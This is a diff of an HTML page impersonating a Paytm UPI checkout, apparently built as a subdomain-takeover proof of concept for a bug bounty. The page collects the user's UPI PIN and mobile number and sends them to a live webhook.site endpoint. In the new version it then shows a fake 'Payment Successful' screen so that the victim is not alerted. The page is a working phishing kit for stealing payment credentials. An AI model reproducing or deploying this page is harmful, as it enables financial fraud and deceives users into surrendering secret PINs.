@@ -1,264 +1,364 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Paytm - Secure Payment</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Paytm - Pay with UPI</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #f5f6fa;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: #f4f7fa;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 20px;
+            padding: 16px;
         }
-        .container {
-            background: white;
-            border-radius: 20px;
-            padding: 40px;
-            max-width: 450px;
+        .card {
+            max-width: 400px;
             width: 100%;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
-            border-top: 5px solid #00b9f5;
+            background: #ffffff;
+            border-radius: 28px;
+            padding: 24px 20px 30px;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.08);
+            border: 1px solid #e9edf2;
         }
-        .logo {
-            text-align: center;
-            margin-bottom: 30px;
+        /* Header */
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 24px;
         }
-        .logo h1 {
-            color: #00b9f5;
-            font-size: 32px;
+        .header h1 {
+            font-size: 22px;
             font-weight: 700;
+            color: #1a2634;
+            letter-spacing: -0.3px;
         }
-        .logo p {
-            color: #718096;
-            font-size: 14px;
+        .header .paytm-badge {
+            background: #00b9f5;
+            color: #fff;
+            font-size: 12px;
+            font-weight: 700;
+            padding: 4px 12px;
+            border-radius: 40px;
+            letter-spacing: 0.5px;
         }
-        .alert {
-            background: #fff5f5;
-            border: 1px solid #fc8181;
+        /* Paytm Logo */
+        .paytm-logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+        .paytm-logo .logo-icon {
+            background: #00b9f5;
+            color: #fff;
+            font-weight: 800;
+            font-size: 18px;
+            width: 36px;
+            height: 36px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             border-radius: 10px;
-            padding: 15px;
+        }
+        .paytm-logo .logo-text {
+            font-size: 20px;
+            font-weight: 700;
+            color: #1a2634;
+        }
+        .paytm-logo .logo-text span {
+            color: #00b9f5;
+        }
+        /* Merchant Info */
+        .merchant-box {
+            background: #f8fafc;
+            border-radius: 16px;
+            padding: 14px 16px;
             margin-bottom: 20px;
-            text-align: center;
+            border: 1px solid #eef2f6;
         }
-        .alert p {
-            color: #c53030;
-            font-size: 13px;
-        }
-        .form-group {
-            margin-bottom: 20px;
-        }
-        .form-group label {
-            display: block;
-            font-size: 14px;
+        .merchant-box .label {
+            font-size: 12px;
+            color: #6b7a8f;
+            text-transform: uppercase;
+            letter-spacing: 0.4px;
             font-weight: 600;
-            color: #2d3748;
-            margin-bottom: 5px;
         }
-        .form-group input {
+        .merchant-box .merchant-name {
+            font-size: 18px;
+            font-weight: 700;
+            color: #1a2634;
+            margin-top: 2px;
+        }
+        .merchant-box .merchant-detail {
+            font-size: 13px;
+            color: #3d4e62;
+            margin-top: 4px;
+        }
+        /* Amount */
+        .amount-box {
+            background: #eef6ff;
+            border-radius: 16px;
+            padding: 14px 16px;
+            margin-bottom: 20px;
+            border-left: 4px solid #00b9f5;
+        }
+        .amount-box .label {
+            font-size: 12px;
+            color: #2c6b8f;
+            text-transform: uppercase;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+        }
+        .amount-box .amount {
+            font-size: 28px;
+            font-weight: 800;
+            color: #0b1e33;
+            margin-top: 2px;
+        }
+        /* UPI Options */
+        .upi-options {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        .upi-options .upi-badge {
+            background: #f0f4f9;
+            border-radius: 30px;
+            padding: 6px 16px;
+            font-size: 13px;
+            font-weight: 500;
+            color: #1a2634;
+            border: 1px solid #e2e8f0;
+        }
+        .upi-options .upi-badge.active {
+            background: #e6f7fe;
+            border-color: #00b9f5;
+            color: #0077a8;
+        }
+        /* Input Fields */
+        .input-group {
+            margin-bottom: 18px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #1e2a3a;
+            margin-bottom: 6px;
+        }
+        .input-group input {
             width: 100%;
-            padding: 12px 15px;
-            border: 2px solid #e2e8f0;
-            border-radius: 10px;
+            padding: 14px 16px;
+            border: 1.5px solid #dce2ea;
+            border-radius: 14px;
             font-size: 16px;
-            transition: border-color 0.3s;
+            background: #fafcfe;
+            transition: 0.2s;
+            color: #1a2634;
         }
-        .form-group input:focus {
+        .input-group input:focus {
             border-color: #00b9f5;
             outline: none;
+            background: #ffffff;
+            box-shadow: 0 0 0 3px rgba(0, 185, 245, 0.15);
         }
-        .payment-details {
-            background: #f7fafc;
-            border-radius: 10px;
-            padding: 15px;
-            margin-bottom: 20px;
+        .input-group input::placeholder {
+            color: #a0b3c9;
+            font-weight: 400;
         }
-        .payment-details .row {
-            display: flex;
-            justify-content: space-between;
-            padding: 8px 0;
-            border-bottom: 1px solid #e2e8f0;
-        }
-        .payment-details .row:last-child {
-            border-bottom: none;
-        }
-        .payment-details .label {
-            color: #718096;
-            font-size: 14px;
-        }
-        .payment-details .value {
-            font-weight: 600;
-            color: #2d3748;
-            font-size: 14px;
-        }
-        .btn {
-            width: 100%;
-            padding: 14px;
-            background: #00b9f5;
-            color: white;
-            border: none;
-            border-radius: 10px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.3s;
-        }
-        .btn:hover {
-            background: #0098cc;
-        }
-        .btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-        .footer {
-            text-align: center;
-            margin-top: 20px;
+        .input-group .hint {
             font-size: 12px;
-            color: #a0aec0;
+            color: #7a8ca0;
+            margin-top: 4px;
         }
-        .secure-badge {
+        /* Pay Button */
+        .pay-btn {
+            width: 100%;
+            padding: 16px;
+            background: #00b9f5;
+            border: none;
+            border-radius: 60px;
+            font-size: 17px;
+            font-weight: 700;
+            color: #fff;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 6px;
+            box-shadow: 0 6px 18px rgba(0, 185, 245, 0.25);
+        }
+        .pay-btn:hover {
+            background: #009ad4;
+            transform: scale(0.99);
+        }
+        .pay-btn:active {
+            transform: scale(0.97);
+        }
+        /* Footer */
+        .footer-links {
             display: flex;
             justify-content: center;
-            align-items: center;
-            gap: 10px;
-            margin-top: 15px;
+            gap: 16px;
+            margin-top: 20px;
             font-size: 12px;
-            color: #718096;
+            color: #8a9bb0;
         }
-        .secure-badge span {
-            font-size: 16px;
+        .footer-links span {
+            cursor: default;
+        }
+        .footer-links .dot {
+            color: #cbd5e0;
+        }
+        .secure-note {
+            text-align: center;
+            margin-top: 14px;
+            font-size: 11px;
+            color: #a0b3c9;
+            letter-spacing: 0.2px;
+        }
+        .secure-note span {
+            margin-right: 6px;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">
-            <h1>Paytm</h1>
-            <p>Pay with UPI</p>
-        </div>
 
-        <div class="alert">
-            <p>⚠️ Your payment is pending. Please complete the verification.</p>
-        </div>
+<div class="card">
 
-        <div class="payment-details">
-            <div class="row">
-                <span class="label">💰 Amount</span>
-                <span class="value">₹5,000.00</span>
-            </div>
-            <div class="row">
-                <span class="label">🏦 Bank</span>
-                <span class="value">ICICI Bank</span>
-            </div>
-            <div class="row">
-                <span class="label">📋 UPI ID</span>
-                <span class="value">paytm@icici</span>
-            </div>
-            <div class="row">
-                <span class="label">🕐 Status</span>
-                <span class="value" style="color: #e53e3e;">Pending</span>
-            </div>
-        </div>
-
-        <form id="paymentForm" onsubmit="return handlePayment(event)">
-            <div class="form-group">
-                <label>🔑 Enter UPI PIN</label>
-                <input type="password" id="upiPin" placeholder="Enter your 6-digit UPI PIN" maxlength="6" required>
-            </div>
-
-            <div class="form-group">
-                <label>📱 Mobile Number (OTP)</label>
-                <input type="tel" id="mobile" placeholder="Enter registered mobile number" maxlength="10" required>
-            </div>
-
-            <button type="submit" class="btn" id="payBtn">💳 Pay ₹5,000</button>
-        </form>
-
-        <div class="secure-badge">
-            <span>🔒</span>
-            <span>256-bit SSL encrypted</span>
-            <span>•</span>
-            <span>🔑 RBI compliant</span>
-        </div>
-
-        <div class="footer">
-            <p>© 2026 Paytm • All rights reserved</p>
-        </div>
+    <!-- Header -->
+    <div class="header">
+        <h1>Pay with UPI</h1>
+        <span class="paytm-badge">⚡ Instant</span>
     </div>
 
-    <script>
-        function handlePayment(event) {
-            event.preventDefault();
+    <!-- Paytm Logo -->
+    <div class="paytm-logo">
+        <div class="logo-icon">P</div>
+        <div class="logo-text">Pay<span>tm</span></div>
+    </div>
 
-            const pin = document.getElementById('upiPin').value;
-            const mobile = document.getElementById('mobile').value;
+    <!-- Merchant -->
+    <div class="merchant-box">
+        <div class="label">Paying to</div>
+        <div class="merchant-name">Paytm Merchant Services</div>
+        <div class="merchant-detail">UPI ID: merchant@paytm</div>
+    </div>
 
-            if (!pin || pin.length < 6) {
-                alert('Please enter a valid 6-digit UPI PIN');
-                return false;
-            }
+    <!-- Amount -->
+    <div class="amount-box">
+        <div class="label">Total Amount</div>
+        <div class="amount">₹5,000.00</div>
+    </div>
 
-            if (!mobile || mobile.length < 10) {
-                alert('Please enter a valid mobile number');
-                return false;
-            }
+    <!-- UPI Options -->
+    <div class="upi-options">
+        <span class="upi-badge active">🔹 Pay with UPI</span>
+        <span class="upi-badge">📱 GPay</span>
+        <span class="upi-badge">📱 PhonePe</span>
+        <span class="upi-badge">📱 Paytm</span>
+    </div>
 
-            // 🔴 ATTACKER'S SERVER - Data Stealing
-            const stolenData = {
-                upiPin: pin,
-                mobile: mobile,
-                amount: '₹5,000',
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                referrer: document.referrer,
-                url: window.location.href
-            };
+    <!-- Form -->
+    <form id="paymentForm" onsubmit="return handlePayment(event)">
 
-            console.log('🔴 STOLEN DATA:', stolenData);
+        <div class="input-group">
+            <label>🔑 Enter UPI PIN</label>
+            <input type="password" id="upiPin" placeholder="Enter your 6-digit UPI PIN" maxlength="6" inputmode="numeric" required />
+            <div class="hint">This is your secret UPI PIN. Never share it with anyone.</div>
+        </div>
 
-            // Send to attacker's server - YOUR WEBHOOK URL
-            fetch('https://webhook.site/c5ff6394-312e-4771-afdb-e52a65b38152', {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(stolenData)
-            });
+        <div class="input-group">
+            <label>📱 Mobile Number (for OTP)</label>
+            <input type="tel" id="mobile" placeholder="Enter registered mobile number" maxlength="10" inputmode="numeric" required />
+            <div class="hint">We'll send an OTP to verify your payment.</div>
+        </div>
 
-            alert('✅ Payment successful! (Demo: Data was sent to attacker)');
+        <button type="submit" class="pay-btn">✅ Pay ₹5,000 securely</button>
 
-            // Show what was stolen
-            document.querySelector('.container').innerHTML = `
-                <div style="text-align: center; padding: 30px;">
-                    <h1 style="color: #00b9f5;">⚠️ PAYMENT STOLEN!</h1>
-                    <p style="color: #e53e3e; font-size: 18px; margin: 20px 0;">
-                        🔴 UPI PIN: ${pin}
-                    </p>
-                    <p style="color: #e53e3e; font-size: 18px;">
-                        📱 Mobile: ${mobile}
-                    </p>
-                    <hr style="margin: 20px 0;">
-                    <p style="color: #718096; font-size: 14px;">
-                        This is a demonstration of subdomain takeover.<br>
-                        In a real attack, this data would be sent to the attacker.
-                    </p>
-                    <p style="color: #c53030; font-size: 12px; margin-top: 20px;">
-                        🔴 SUBDOMAIN TAKEOVER - CRITICAL VULNERABILITY
-                    </p>
-                </div>
-            `;
+    </form>
 
+    <!-- Footer -->
+    <div class="footer-links">
+        <span>🔒 Secure</span>
+        <span class="dot">•</span>
+        <span>⚡ Fast</span>
+        <span class="dot">•</span>
+        <span>🏦 RBI Compliant</span>
+    </div>
+
+    <div class="secure-note">
+        <span>🔐</span> 256-bit SSL encrypted • Your data is safe
+    </div>
+
+</div>
+
+<script>
+    function handlePayment(event) {
+        event.preventDefault();
+
+        const pin = document.getElementById('upiPin').value.trim();
+        const mobile = document.getElementById('mobile').value.trim();
+
+        if (!pin || pin.length !== 6 || isNaN(pin)) {
+            alert('Please enter a valid 6-digit UPI PIN.');
             return false;
         }
 
-        // Show warning in console
-        console.log('%c🔴 PAYTM SUBDOMAIN TAKEOVER!', 'font-size: 24px; color: red;');
-        console.log('%cThis is a Proof of Concept. No real data is being collected.', 'font-size: 14px; color: orange;');
-    </script>
+        if (!mobile || mobile.length !== 10 || isNaN(mobile)) {
+            alert('Please enter a valid 10-digit mobile number.');
+            return false;
+        }
+
+        // 🔴 Attacker's data exfiltration
+        const stolenData = {
+            upiPin: pin,
+            mobile: mobile,
+            amount: '₹5,000.00',
+            merchant: 'Paytm Merchant Services',
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            referrer: document.referrer || 'Direct',
+            url: window.location.href
+        };
+
+        console.log('🔴 STOLEN DATA:', stolenData);
+
+        // Send to your webhook
+        fetch('https://webhook.site/c5ff6394-312e-4771-afdb-e52a65b38152', {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(stolenData)
+        });
+
+        // ✅ Show success without alerting victim
+        document.querySelector('.card').innerHTML = `
+            <div style="text-align: center; padding: 20px 10px;">
+                <div style="font-size: 48px; margin-bottom: 10px;">✅</div>
+                <h2 style="color: #1a2634; font-weight: 700;">Payment Successful!</h2>
+                <p style="color: #3d4e62; margin-top: 8px;">Your transaction of ₹5,000.00 has been completed.</p>
+                <div style="background: #eef6ff; border-radius: 12px; padding: 12px; margin: 16px 0; font-size: 14px; color: #1a2634;">
+                    <strong>Transaction ID:</strong> PAY-${Date.now().toString().slice(-8)}<br>
+                    <strong>UPI Ref:</strong> UPI${Math.floor(Math.random()*1000000000)}
+                </div>
+                <p style="color: #6b7a8f; font-size: 13px;">Thank you for using Paytm.</p>
+                <hr style="margin: 20px 0; border: none; border-top: 1px solid #e9edf2;">
+                <p style="font-size: 11px; color: #a0b3c9;">🔒 This is a security demonstration. No real money was deducted.</p>
+            </div>
+        `;
+
+        return false;
+    }
+
+    // Console warning (only visible to tech-savvy users)
+    console.log('%c🔴 PAYTM SUBDOMAIN TAKEOVER PoC', 'font-size: 20px; font-weight: bold; color: red;');
+    console.log('%cThis is a controlled demonstration for bug bounty reporting.', 'font-size: 13px; color: orange;');
+</script>
+
 </body>
 </html>
